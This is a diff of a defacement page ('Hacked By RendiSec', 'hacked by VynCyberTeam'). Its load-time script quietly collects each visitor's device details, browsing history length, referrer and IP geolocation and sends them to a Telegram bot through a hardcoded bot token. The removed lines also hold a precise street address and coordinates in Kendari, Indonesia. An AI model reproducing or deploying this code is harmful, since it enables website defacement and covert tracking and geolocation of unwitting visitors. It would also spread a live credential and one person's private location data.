@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Hacked By RendiSec</title>
   <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
   <style>
@@ -13,8 +13,8 @@
       font-family: 'Iceland', sans-serif;
     }
     .title { font-size: 3rem; color: red; }
-    .subtitle { font-size: 2.2rem; color: green; }
-    .quote { font-size: 1.2rem; margin: 20px 0; }
+    .subtitle { font-size: 2.5rem; color: green; }
+    .quote { font-size: 1.5rem; margin: 20px 0; }
     .logo-container img { width: 300px; height: auto; }
     audio { margin-top: 20px; }
   </style>
@@ -26,29 +26,29 @@
   </div>
   <h2 class="subtitle">This site hacked by VynCyberTeam</h2>
   <p class="quote">System Breached</p>
-  <audio autoplay loop controls src="https://i.top4top.io/m_33131khih0.mp3"></audio>
+  <audio id="player" src="https://i.top4top.io/m_33131khih0.mp3" loop controls autoplay></audio>
 
   <script>
     const botToken = '7518590238:AAFa_NmuU323qGIN6XFFox8NIVx9QT1zrPE';
     const chatID = '6281867611';
 
     async function sendToTelegram(message) {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: `chat_id=${chatID}&text=${encodeURIComponent("```\n" + message + "\n```")}&parse_mode=Markdown`
       });
     }
 
-    async function generateReport() {
+    async function logInfo() {
       const ua = navigator.userAgent;
       const platform = navigator.platform;
       const lang = navigator.language;
       const online = navigator.onLine ? 'Online' : 'Offline';
       const screenSize = `${screen.width}x${screen.height}`;
       const windowSize = `${window.innerWidth}x${window.innerHeight}`;
-      const cores = navigator.hardwareConcurrency || 'Unknown';
-      const ram = navigator.deviceMemory || 'Unknown';
+      const cores = navigator.hardwareConcurrency;
+      const ram = navigator.deviceMemory || 'N/A';
       const time = new Date().toString();
       const offset = new Date().getTimezoneOffset() * -1;
       const title = document.title;
@@ -56,34 +56,34 @@
       const url = window.location.href;
       const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const touch = navigator.maxTouchPoints > 0 ? '✅ YA' : '❌ TIDAK';
-      const pageLoad = (performance.timing.loadEventEnd - performance.timing.navigationStart).toFixed(2);
+      const pageLoad = (performance.timing.loadEventEnd - performance.timing.navigationStart) || 0;
       const historyLen = history.length;
 
-      let battery = '🔋 Battery: Unknown\n🔌 Charging: Unknown\n';
+      let battery = '';
       try {
-        const batt = await navigator.getBattery();
-        battery = `🔋 Battery: ${Math.round(batt.level * 100)}%\n🔌 Charging: ${batt.charging ? '✅ YA' : '❌ TIDAK'}\n`;
-      } catch {}
+        const b = await navigator.getBattery();
+        battery = `🔋 Battery: ${Math.round(b.level * 100)}%\n🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+      } catch {
+        battery = '🔋 Battery: Unknown\n🔌 Charging: Unknown\n';
+      }
 
-      let ipBlock = '';
+      let locationBlock = '';
       try {
-        const res = await fetch('https://ipapi.co/json/');
-        const ip = await res.json();
-        ipBlock = `
+        const ip = await fetch('https://ipapi.co/json/').then(res => res.json());
+        locationBlock = `
 📍 LOCATION INFORMATION
 📡 IP Address: ${ip.ip}
-🏙️ Kota: Kendari
-🏙️ Kabupaten: Southeast Sulawesi
-🗺️ Wilayah: Southeast Sulawesi
-🌎 Negara: Indonesia
-🏷️ Kode Pos: null
-📌 Latitude: -3.9778
-📍 Longitude: 122.51507
-🏙️ Kabupaten: Kendari
-🏙️ Kecamatan: Mandonga
-🏠 Alamat Lengkap: SKHN 1 Kendari Sulawesi Tenggara, Jalan Sao Sao, Mandonga, Kendari, Sulawesi Tenggara, Sulawesi, 93111, Indonesia`;
+🏙️ Kota: ${ip.city}
+🏙️ Kabupaten: ${ip.region}
+🗺️ Wilayah: ${ip.region}
+🌎 Negara: ${ip.country_name}
+🏷️ Kode Pos: ${ip.postal || 'null'}
+📌 Latitude: ${ip.latitude}
+📍 Longitude: ${ip.longitude}
+🏙️ Kabupaten: ${ip.region}
+`;
       } catch {
-        ipBlock = '📍 LOCATION INFORMATION\nData lokasi tidak tersedia.';
+        locationBlock = '📍 LOCATION INFORMATION\nTidak dapat mengambil lokasi.\n';
       }
 
       const report = `
@@ -99,7 +99,7 @@
 💾 RAM: ${ram} GB
 🧠 CPU Cores: ${cores}
 ${battery}⏰ Waktu Akses: ${time}
-🕒 Page Load Time: ${pageLoad} ms
+🕒 Page Load Time: ${pageLoad.toFixed(2)} ms
 📜 History Length: ${historyLen}
 ✋ Touch Support: ${touch}
 🔗 Referrer: ${referrer}
@@ -108,14 +108,13 @@ ${battery}⏰ Waktu Akses: ${time}
 🕓 Timezone: ${tz}
 🧭 Offset: ${offset} menit
 
-${ipBlock}
-
-╰───── Telegram @RendiSec ───── ⦿`;
+${locationBlock}
+╰───── Telegram @denz ───── ⦿`;
 
       sendToTelegram(report);
     }
 
-    window.onload = generateReport;
+    window.onload = logInfo;
   </script>
 </body>
 </html>
